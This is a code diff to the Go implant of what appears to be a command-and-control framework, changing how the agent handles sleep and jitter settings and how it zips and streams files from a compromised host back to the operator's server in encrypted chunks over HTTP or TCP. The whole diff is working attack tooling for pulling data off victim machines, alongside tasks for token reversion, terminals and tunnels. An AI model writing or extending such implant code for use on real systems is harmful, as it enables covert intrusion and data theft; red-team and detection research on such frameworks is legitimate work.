@@ -32,6 +32,18 @@ var DOWNLOADS map[string]utils.Connection
 var JOBS map[string]utils.Connection
 var TUNNELS sync.Map
 var TERMINALS sync.Map
+var HTTP_DOWNLOADS sync.Map
+
+type DownloadState struct {
+	FileId    int
+	Path      string
+	Reader    io.ReadCloser
+	TotalSize int64
+	SentSize  int64
+	ChunkSize int64
+	JobId     string
+	Start     bool
+}
 
 type TunnelController struct {
 	Cancel context.CancelFunc
@@ -98,6 +110,9 @@ func TaskProcess(commands [][]byte) [][]byte {
 
 		case utils.COMMAND_REV2SELF:
 			data, err = taskRev2Self()
+
+		case utils.COMMAND_SLEEP:
+			data, err = taskSleep(command.Data)
 
 		case utils.COMMAND_RM:
 			data, err = taskRm(command.Data)
@@ -424,6 +439,19 @@ func taskRev2Self() ([]byte, error) {
 	return nil, nil
 }
 
+func taskSleep(paramsData []byte) ([]byte, error) {
+	var params utils.ParamsSleep
+	err := msgpack.Unmarshal(paramsData, &params)
+	if err != nil {
+		return nil, err
+	}
+
+	profile.Sleep = params.Sleep
+	profile.Jitter = params.Jitter
+
+	return nil, nil
+}
+
 func taskRm(paramsData []byte) ([]byte, error) {
 	var params utils.ParamsRm
 	err := msgpack.Unmarshal(paramsData, &params)
@@ -642,88 +670,68 @@ func jobDownloadStart(paramsData []byte) ([]byte, error) {
 		return nil, err
 	}
 
-	size := info.Size() // тип int64
+	size := info.Size()
 
 	if size > 4*1024*1024*1024 {
 		return nil, errors.New("file too big (>4GB)")
 	}
 
 	var content []byte
+	var reader io.ReadCloser
+	var isZip bool
+
 	if info.IsDir() {
 		content, err = functions.ZipDirectory(path)
 		path += ".zip"
+		if err != nil {
+			return nil, err
+		}
+		reader = io.NopCloser(bytes.NewReader(content))
+		size = int64(len(content))
+		isZip = true
 	} else {
-		content, err = os.ReadFile(path)
-	}
-	if err != nil {
-		return nil, err
+		f, err := os.Open(path)
+		if err != nil {
+			return nil, err
+		}
+		reader = f
+		isZip = false
 	}
 
 	// =================================
 	// HTTP MODE
 	// =================================
 	if profile.Uri != "" {
-		go func() {
-			targetUrl := ""
-			scheme := "http"
-			if profile.UseSSL {
-				scheme = "https"
-			}
-			targetUrl = fmt.Sprintf("%s://%s%s", scheme, profile.Addresses[0], profile.Uri)
+		strFileId := params.Task
+		FileId, _ := strconv.ParseInt(strFileId, 16, 64)
 
-			strFileId := params.Task
-			FileId, _ := strconv.ParseInt(strFileId, 16, 64)
-
-			job := utils.Job{
-				CommandId: utils.COMMAND_DOWNLOAD,
-				JobId:     params.Task,
-			}
-
-			chunkSize := 0x100000 // 1MB
-			totalSize := len(content)
-			for i := 0; i < totalSize; i += chunkSize {
-
-				end := i + chunkSize
-				if end > totalSize {
-					end = totalSize
-				}
-				start := i == 0
-				finish := end == totalSize
-
-				job.Data, _ = msgpack.Marshal(utils.AnsDownload{
-					FileId:   int(FileId),
-					Path:     path,
-					Content:  content[i:end],
-					Size:     len(content),
-					Start:    start,
-					Finish:   finish,
-					Canceled: false,
-				})
-				packedJob, _ := msgpack.Marshal(job)
-
-				message := utils.Message{
-					Type:   2, // Job Data Type
-					Object: [][]byte{packedJob},
-				}
-
-				sendData, _ := msgpack.Marshal(message)
-				sendData, _ = utils.EncryptData(sendData, utils.SKey)
-
-				// Send via HTTP
-				_, _ = sendDataHttp(targetUrl, sendData)
-
-				if finish {
-					break
-				}
-				time.Sleep(time.Millisecond * 100)
-			}
-		}()
+		state := &DownloadState{
+			FileId:    int(FileId),
+			Path:      path,
+			Reader:    reader,
+			TotalSize: size,
+			SentSize:  0,
+			ChunkSize: 512 * 1024, // 512 KB
+			JobId:     params.Task,
+			Start:     true,
+		}
+		HTTP_DOWNLOADS.Store(params.Task, state)
 		return nil, nil
 	}
 
 	// =================================
 	// TCP MODE
 	// =================================
+
+	// Read full content for TCP
+	if !isZip {
+		content, err = io.ReadAll(reader)
+		reader.Close()
+		if err != nil {
+			return nil, err
+		}
+	}
+
 	var conn net.Conn
 	if profile.UseSSL {
 		cert, certerr := tls.X509KeyPair(profile.SslCert, profile.SslKey)
@@ -1393,4 +1401,60 @@ func jobTerminal(paramsData []byte) {
 		_ = process.Wait()
 		cancel()
 	}()
+}
+
+func ProcessDownloads() [][]byte {
+	var result [][]byte
+
+	HTTP_DOWNLOADS.Range(func(key, value interface{}) bool {
+		state := value.(*DownloadState)
+
+		buffer := make([]byte, state.ChunkSize)
+		n, err := state.Reader.Read(buffer)
+
+		if err != nil && err != io.EOF {
+			state.Reader.Close()
+			HTTP_DOWNLOADS.Delete(key)
+			return true
+		}
+
+		if n > 0 {
+			state.SentSize += int64(n)
+		}
+
+		finish := false
+		if err == io.EOF || state.SentSize >= state.TotalSize {
+			finish = true
+		}
+
+		if n > 0 || finish {
+			job := utils.Job{
+				CommandId: utils.COMMAND_DOWNLOAD,
+				JobId:     state.JobId,
+			}
+
+			job.Data, _ = msgpack.Marshal(utils.AnsDownload{
+				FileId:   state.FileId,
+				Path:     state.Path,
+				Content:  buffer[:n],
+				Size:     int(state.TotalSize),
+				Start:    state.Start,
+				Finish:   finish,
+				Canceled: false,
+			})
+			state.Start = false
+
+			packedJob, _ := msgpack.Marshal(job)
+			result = append(result, packedJob)
+		}
+
+		if finish {
+			state.Reader.Close()
+			HTTP_DOWNLOADS.Delete(key)
+		}
+
+		return true
+	})
+
+	return result
 }
